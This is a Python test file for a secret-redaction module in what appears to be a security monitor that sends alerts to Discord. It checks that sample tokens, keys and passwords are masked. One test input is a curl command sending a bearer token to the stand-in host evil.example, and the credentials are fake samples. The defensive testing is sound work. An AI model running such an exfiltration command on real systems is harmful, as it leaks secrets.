"""Secrets never reach the Discord webhook (Vera's audit, 2026-10-14): findings quote process command lines and hook
commands, which can hold tokens, and Discord is the one transport that leaves the machine."""
import json

import pytest

from sentinel import alerts
from sentinel.redact import redact

SECRETS = [
    ("node x.js --token ghp_abcdefghijklmnopqrstuvwxyz0123456789", "ghp_abcdefghij"),
    ("app --api-key sk-ant-api03-abcdefghijklmnop_QRSTUV", "sk-ant-api03"),
    ("npm publish npm_abcdefghijklmnopqrstuvwxyz0123456789", "npm_abcdefghij"),
    ("curl -H 'Authorization: Bearer abcdef1234567890xyz' https://evil.example", "abcdef1234567890xyz"),
    ("export AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY", "wJalrXUtnFEMI"),
    ("aws AKIAIOSFODNN7EXAMPLE configure", "AKIAIOSFODNN7EXAMPLE"),
    ("git clone https://user:hunter2@github.com/x/y", "hunter2"),
    ('PASSWORD="correct horse" app', "correct horse"),
    ("node app --password hunter2hunter2", "hunter2hunter2"),
    ("app --token=abc123secretvalue", "abc123secretvalue"),
    ("slack xoxb-1234567890-abcdefghij", "xoxb-1234567890"),
    ("jwt eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0.dozjgNryP4J3jVmNHl0w5N_XgL0n3I9PlFUP0THsR8U", "eyJhbGci"),
    ("glab glpat-abcdefghij1234567890", "glpat-abcdefghij"),
    ("curl https://discord.com/api/webhooks/123456/abcdefSECRETtoken_x", "abcdefSECRETtoken_x"),
    ("python3 run.py 9f8e7d6c5b4a39281706f5e4d3c2b1a0aa11bb22", "9f8e7d6c5b4a39281706"),
]


@pytest.mark.parametrize("text,secret", SECRETS)
def test_the_secret_is_gone(text, secret):
    out = redact(text)
    assert secret not in out and "REDACTED" in out, out


@pytest.mark.parametrize("text", [
    'Line: LISTEN 0 128 *:8080 users:(("node",pid=1234,fd=3))',
    "Found /home/me/.local/bin/gh-token-monitor.sh. This is a known Shai-Hulud payload file.",
    "Found authentication tokens in /home/me/.npmrc. If compromised, attackers can publish packages under your name.",
    "Services listening on all interfaces: 22, 631",
    "Compromised package: @ctrl/tinycolor@4.1.1",
])
def test_ordinary_alert_text_is_left_alone(text):
    assert redact(text) == text


def test_a_failure_inside_withholds_everything(monkeypatch):
    import sentinel.redact as r

    class Boom:
        def sub(self, *a):
            raise RuntimeError("bad pattern")
    monkeypatch.setattr(r, "_PATTERNS", [(Boom(), "")])
    assert r.redact("ghp_abcdefghijklmnopqrstuvwxyz0123456789") == "[alert text withheld: redaction failed]"


def test_the_discord_payload_is_redacted(monkeypatch):
    sent = []

    def fake_urlopen(req, timeout=10):
        sent.append(json.loads(req.data))
    import urllib.request
    monkeypatch.setattr(urllib.request, "urlopen", fake_urlopen)
    ok = alerts.DiscordWebhookAlert("https://discord.example/webhook").send(
        "[!!!] Suspicious process: x\n    Found: node x.js --token ghp_abcdefghijklmnopqrstuvwxyz0123456789", "critical")
    body = json.dumps(sent)
    assert ok and sent and "ghp_abcdefghij" not in body and "REDACTED" in body


def test_switching_discord_on_says_what_leaves(caplog):
    with caplog.at_level("WARNING"):
        alerts.DiscordWebhookAlert("https://discord.example/webhook")
    assert "Discord's servers" in caplog.text and "redacted" in caplog.text


@pytest.mark.parametrize("text,label", [
    ("push ghp_" + "a1" * 10, "[REDACTED github token]"),           # short: below the catch-all's 32
    ("push github_pat_" + "a1" * 10, "[REDACTED github token]"),
    ("publish npm_" + "a1" * 10, "[REDACTED npm token]"),
    ("call sk-" + "a1" * 10, "[REDACTED api key]"),
    ("maps AIza" + "Sy" * 16, "[REDACTED google key]"),              # no digit: the catch-all wouldn't take it
])
def test_each_known_shape_is_caught_by_its_own_rule(text, label):
    assert label in redact(text)
